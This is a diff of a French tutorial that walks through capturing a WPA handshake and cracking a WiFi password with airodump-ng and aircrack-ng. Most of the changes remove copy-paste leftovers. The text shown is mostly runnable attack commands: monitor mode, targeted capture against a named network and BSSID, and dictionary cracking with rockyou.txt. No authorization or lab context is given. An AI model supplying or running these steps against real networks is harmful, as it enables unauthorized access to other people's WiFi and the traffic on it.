@@ -13,41 +13,34 @@ Droits root (sudo)
 
 Étape 1 : Mettre la carte WiFi en mode monitor
 bash
-Copier
-Modifier
+
 sudo ip link set wlan0 down
 sudo iw dev wlan0 set type monitor
 sudo ip link set wlan0 up
+
 On passe l’interface wlan0 en mode monitor (écoute passive)
 
 Vérifie avec :
 
-bash
-Copier
-Modifier
 iwconfig
+
 Tu dois voir wlan0 en mode Monitor.
 
 Étape 2 : Scanner les réseaux WiFi autour
-bash
-Copier
-Modifier
+
 sudo airodump-ng wlan0
+
 Repère le réseau cible (BSSID) et note le canal (CH) et le nom du réseau (ESSID)
 
 Exemple :
 
-ruby
-Copier
-Modifier
+
 BSSID              PWR  CH  ESSID
 CC:32:E5:CB:27:89  -29  11  Starlink_privée
+
 Étape 3 : Capter les handshakes (captures des paquets)
 Lance la capture ciblée sur le réseau et son canal :
 
-bash
-Copier
-Modifier
 sudo airodump-ng --bssid CC:32:E5:CB:27:89 -c 11 -w capture wlan0
 --bssid : cible le réseau
 
@@ -73,18 +66,15 @@ wlan0 : interface en mode monitor
 Étape 5 : Vérifier la capture du handshake
 Retourne dans le terminal avec airodump-ng et regarde la ligne en haut :
 
-ruby
-Copier
-Modifier
+
 WPA handshake: CC:32:E5:CB:27:89
+
 Si tu vois ça, tu as le handshake !
 
 Étape 6 : Cracker le mot de passe avec aircrack-ng
 Maintenant que tu as le fichier de capture, utilise la liste de mots de passe rockyou.txt :
 
-bash
-Copier
-Modifier
+
 sudo aircrack-ng -w /home/kali/Downloads/rockyou.txt /home/kali/capture-01.cap
 -w : chemin vers la liste de mots de passe
 
@@ -105,9 +95,7 @@ Utilise une bonne liste de mots de passe (ex: rockyou.txt, darkc0de.lst)
 Patience, ça peut prendre du temps selon la taille de ta liste et la puissance de ta machine
 
 Exemple complet
-bash
-Copier
-Modifier
+
 # Mode monitor
 sudo ip link set wlan0 down
 sudo iw dev wlan0 set type monitor
